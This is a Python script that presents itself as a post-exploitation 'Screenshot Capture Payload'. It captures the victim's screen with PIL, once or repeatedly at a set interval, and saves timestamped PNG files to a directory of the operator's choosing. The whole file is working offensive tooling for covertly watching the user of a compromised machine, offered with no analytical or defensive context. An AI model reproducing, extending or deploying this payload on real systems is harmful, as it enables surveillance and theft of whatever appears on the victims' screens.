#!/usr/bin/env python3
"""
Screenshot Capture Payload
Capture screenshots for post-exploitation
"""

import argparse
import time
from datetime import datetime
import sys

try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[!] PIL/Pillow not installed. Install with: pip install pillow")

def capture_screenshot(output_file=None):
    """Capture a single screenshot"""
    if not PIL_AVAILABLE:
        print("[-] Cannot capture screenshot - PIL not available")
        return False

    try:
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"screenshot_{timestamp}.png"

        screenshot = ImageGrab.grab()
        screenshot.save(output_file)
        print(f"[+] Screenshot saved: {output_file}")
        return True

    except Exception as e:
        print(f"[-] Error capturing screenshot: {e}")
        return False

def continuous_capture(interval=60, output_dir="."):
    """Continuously capture screenshots at specified interval"""
    print(f"[*] Starting continuous capture (interval: {interval}s)")
    print("[*] Press Ctrl+C to stop")

    count = 0
    try:
        while True:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"{output_dir}/screenshot_{timestamp}.png"

            if capture_screenshot(output_file):
                count += 1

            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n[*] Captured {count} screenshots")

def main():
    parser = argparse.ArgumentParser(description='Screenshot Capture Tool')
    parser.add_argument('-o', '--output', help='Output file name')
    parser.add_argument('-c', '--continuous', action='store_true', help='Continuous capture mode')
    parser.add_argument('-i', '--interval', type=int, default=60, help='Capture interval in seconds (default: 60)')
    parser.add_argument('-d', '--directory', default='.', help='Output directory for continuous mode')

    args = parser.parse_args()

    if args.continuous:
        continuous_capture(args.interval, args.directory)
    else:
        capture_screenshot(args.output)

if __name__ == "__main__":
    main()
